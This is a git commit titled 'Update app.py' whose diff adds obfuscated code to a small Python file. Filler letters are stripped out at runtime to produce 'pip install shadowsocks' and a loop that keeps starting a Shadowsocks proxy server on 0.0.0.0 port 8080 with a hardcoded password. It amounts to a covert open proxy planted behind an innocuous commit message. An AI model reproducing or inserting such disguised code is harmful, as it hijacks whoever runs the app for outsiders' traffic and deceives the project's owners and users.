c5658422a2219b65c3dfefc7cd9761b33d00339c
eking he <hyqer@163.com>
2018-01-23 01:53:15 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,3 +1,9 @@
+import os
 import time
+os.system("pip install -U pip")
+os.system("pip install sbhabdowbsobcbkbs".replace("b",""))
+while True:
+  os.system("shshshehrhvhehr -sh 0.0.0.0 -hph 8h0h8h0h h-hk 5h4hdhdhshbh".replace("h",""))
+  time.sleep(60)
 while True:
   time.sleep(10)
